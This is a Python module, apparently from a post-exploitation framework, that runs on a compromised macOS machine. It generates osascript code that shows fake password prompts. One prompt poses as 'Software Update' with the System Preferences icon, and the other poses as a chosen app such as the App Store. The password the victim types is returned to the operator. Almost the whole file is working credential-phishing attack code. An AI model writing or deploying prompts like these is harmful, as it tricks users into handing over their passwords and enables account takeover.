class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Prompt',

            # list of one or more authors for the module
            'Author': ['@FuzzyNop', '@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ('Launches a specified application with an prompt for credentials with osascript.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://github.com/fuzzynop/FiveOnceInYourLife"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AppName' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The name of the application to launch.',
                'Required'      :   True,
                'Value'         :   'App Store'
            },
            'ListApps' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Switch. List applications suitable for launching.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SandboxMode' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Switch. Launch a sandbox safe prompt',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        listApps = self.options['ListApps']['Value']
        appName = self.options['AppName']['Value']
        sandboxMode = self.options['SandboxMode']['Value']
        if listApps != "":
            script = """
import os
apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
choices = []
for x in xrange(len(apps)):
    choices.append("[%s] %s " %(x+1, apps[x]) )

print "\\nAvailable applications:\\n"
print '\\n'.join(choices)
"""

        else:
            if sandboxMode != "":
                # osascript prompt for the current application with System Preferences icon
                script = """
import os
print os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read()
"""

            else:
                # osascript prompt for the specific application
                script = """
import os
print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
""" % (appName, appName, appName, appName)

        return script
